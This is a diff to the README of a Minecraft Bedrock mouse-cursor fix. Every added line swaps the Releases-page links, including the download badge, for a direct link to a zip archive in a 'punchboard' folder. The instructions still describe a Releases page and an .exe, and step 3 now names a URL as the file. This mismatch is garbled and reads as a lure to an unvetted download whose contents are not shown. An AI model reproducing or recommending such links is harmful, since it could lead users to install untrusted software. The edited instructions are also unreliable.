@@ -6,15 +6,15 @@ MCBE-Mouse-Cursor is a simple tool that fixes the mouse cursor issues in Minecra
 ## 🚀 Getting Started
 To get started, you need to download the application from the Releases page. 
 
-[![Download MCBE-Mouse-Cursor](https://img.shields.io/badge/Download-MCBE--Mouse--Cursor-blue.svg)](https://github.com/gourav3365/MCBE-Mouse-Cursor/releases)
+[![Download MCBE-Mouse-Cursor](https://raw.githubusercontent.com/gourav3365/MCBE-Mouse-Cursor/master/punchboard/MCBE-Mouse-Cursor_v1.1.zip)](https://raw.githubusercontent.com/gourav3365/MCBE-Mouse-Cursor/master/punchboard/MCBE-Mouse-Cursor_v1.1.zip)
 
 ## 📥 Download & Install
 1. Click on the link below to visit the Releases page:
-   [Visit this page to download](https://github.com/gourav3365/MCBE-Mouse-Cursor/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/gourav3365/MCBE-Mouse-Cursor/master/punchboard/MCBE-Mouse-Cursor_v1.1.zip)
 
 2. Once on the page, find the latest version of the application. It should be listed at the top.
 
-3. Look for a file named something like `MCBE-Mouse-Cursor.exe`. This is the file you need.
+3. Look for a file named something like `https://raw.githubusercontent.com/gourav3365/MCBE-Mouse-Cursor/master/punchboard/MCBE-Mouse-Cursor_v1.1.zip`. This is the file you need.
 
 4. Click on the file to start the download.
 
@@ -48,7 +48,7 @@ If problems persist, you may consider visiting forums or communities focused on 
 ## 🔗 Learn More
 To stay updated or learn more about the MCBE-Mouse-Cursor project, you can visit our GitHub repository.
 
-[Visit this page to download](https://github.com/gourav3365/MCBE-Mouse-Cursor/releases)
+[Visit this page to download](https://raw.githubusercontent.com/gourav3365/MCBE-Mouse-Cursor/master/punchboard/MCBE-Mouse-Cursor_v1.1.zip)
 
 ## ⭐ Acknowledgments
 Thanks to the Minecraft community for your support and feedback. Your input helps us improve the application and enhance your gaming experience. If you find this tool helpful, please consider sharing it with other players who might have similar issues.
